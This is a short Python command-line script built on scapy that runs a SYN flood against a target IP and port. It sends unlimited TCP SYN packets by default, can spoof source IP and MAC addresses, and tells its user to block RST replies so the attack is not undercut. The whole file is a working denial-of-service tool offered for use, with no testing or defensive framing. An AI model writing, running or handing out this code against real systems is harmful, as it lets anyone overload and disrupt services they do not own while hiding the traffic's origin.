import logging
import sys
from random import randint

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import IP, TCP, Ether, RandMAC, conf, sendp


@click.command()
@click.argument('ip')
@click.option('-i', 'interface', default=None, help='Wich interface to use (default: auto)')
@click.option('-c', 'count', default=0, help='How many packets send (default: infinit)')
@click.option('-p', 'port', default=135, help='Port to use (default: 135)')
@click.option('-2', 'forgemac', is_flag=True, default=False, help='Forge layer2/MAC address (default: No)')
@click.option('-3', 'forgeip', is_flag=True, default=False, help='Forge layer3/IP address (default: No)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_synflood(ip, interface, count, port, forgemac, forgeip, verbose):

    conf.verb = False

    if interface:
        conf.iface = interface

    layer2 = Ether()

    layer3 = IP()
    layer3.dst = ip

    layer4 = TCP()
    layer4.dport = port

    pkt = layer2 / layer3 / layer4

    counter = 0

    print("Please, remember to block your RST responses", file=sys.stderr)

    while True:
        if forgeip:
            pkt[IP].src = "%s.%s" %(pkt[IP].src.rsplit('.', maxsplit=1)[0], randint(1, 254))
        if forgemac:
            pkt[Ether].src = RandMAC()

        pkt[TCP].sport = randint(10000, 65000)

        if verbose:
            print(pkt.summary())
        else:
            print('.', end='')
            sys.stdout.flush()

        sendp(pkt)
        counter += 1

        if count != 0 and counter == count:
            break

    return True

if __name__ == '__main__':
    cmd_synflood()
